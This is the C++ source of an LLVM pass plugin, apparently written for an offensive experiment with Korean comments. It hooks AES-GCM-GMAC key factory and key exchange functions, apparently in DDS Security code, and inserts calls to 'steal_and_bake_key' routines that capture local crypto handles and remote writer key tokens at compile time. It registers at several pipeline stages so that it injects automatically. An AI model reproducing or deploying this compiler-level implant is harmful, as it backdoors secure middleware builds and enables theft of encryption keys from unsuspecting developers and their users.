#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/IR/PassManager.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Module.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/Instructions.h"
#include "llvm/IR/Type.h"
#include "llvm/Support/raw_ostream.h"

using namespace llvm;

namespace {

struct ZeroCopyHeistPass : public PassInfoMixin<ZeroCopyHeistPass> {

    PreservedAnalyses run(Function &F, FunctionAnalysisManager &FAM) {
        StringRef FuncName = F.getName();
        
        // 💡 [핵심 수정] 타겟 함수 분리 (TX는 Phase 2, RX는 Phase 4)
        bool isTX = FuncName.contains("register_local_datawriter") && FuncName.contains("AESGCMGMAC_KeyFactory");
        bool isRX = FuncName.contains("set_remote_datawriter_crypto_tokens") && FuncName.contains("AESGCMGMAC_KeyExchange");

        if (!isTX && !isRX) return PreservedAnalyses::all();

        errs() << "\n[ZeroCopyHeistPass] 🎯 Target Function Found: " << FuncName << "\n";

        Module *M = F.getParent();
        LLVMContext &Ctx = M->getContext();
        PointerType *PtrTy = Type::getInt8PtrTy(Ctx); 
        
        FunctionCallee TXStealFunc = M->getOrInsertFunction("steal_and_bake_key", Type::getVoidTy(Ctx), PtrTy);
        FunctionCallee RXStealFunc = M->getOrInsertFunction("steal_and_bake_key_rx", Type::getVoidTy(Ctx), PtrTy);

        bool Changed = false;

        for (BasicBlock &BB : F) {
            for (auto IT = BB.begin(), E = BB.end(); IT != E; ) {
                Instruction &I = *IT++;
                if (ReturnInst *RetInst = dyn_cast<ReturnInst>(&I)) {
                    IRBuilder<> Builder(RetInst);
                    
                    if (isTX) {
                        // TX: 자신이 방금 생성한 핸들(리턴값)을 탈취
                        Value *RetVal = RetInst->getReturnValue();
                        if (RetVal) {
                            Value *CastVal = Builder.CreateBitCast(RetVal, PtrTy);
                            Builder.CreateCall(TXStealFunc, {CastVal});
                            Changed = true;
                            errs() << "\n[success] >>> <steal_and_bake_key> ";

                        }
                    } else if (isRX) {
                        // 💡 RX: 리턴값이 bool이므로, 함수의 두번째 인자(remote_datawriter_crypto) 참조를 탈취!
                        // 💡 [수정] C++ 멤버 함수이므로 Arg(0)은 'this'입니다.
                        // Arg(1): local_reader, Arg(2): remote_writer
                        Value *Arg1 = F.getArg(2); 
                        Value *CastVal = Builder.CreateBitCast(Arg1, PtrTy);
                        Builder.CreateCall(RXStealFunc, {CastVal});
                        Changed = true;
                        errs() << "\n[success] >>> <steal_and_bake_key_rx> ";

                    }
                }
            }
        }
        
        if (Changed) return PreservedAnalyses::none();
        return PreservedAnalyses::all();
    }
};
} // end anonymous namespace

llvm::PassPluginLibraryInfo getZeroCopyHeistPassPluginInfo() {
    return {LLVM_PLUGIN_API_VERSION, "ZeroCopyHeistPass", LLVM_VERSION_STRING,
            [](PassBuilder &PB) {
                auto injectPass = [](ModulePassManager &MPM, OptimizationLevel Level) {
                    MPM.addPass(createModuleToFunctionPassAdaptor(ZeroCopyHeistPass()));
                };
                PB.registerPipelineStartEPCallback(injectPass);
                PB.registerOptimizerLastEPCallback(injectPass);
                PB.registerPipelineEarlySimplificationEPCallback(injectPass);
            }};
}
extern "C" LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo llvmGetPassPluginInfo() {
    return getZeroCopyHeistPassPluginInfo();
}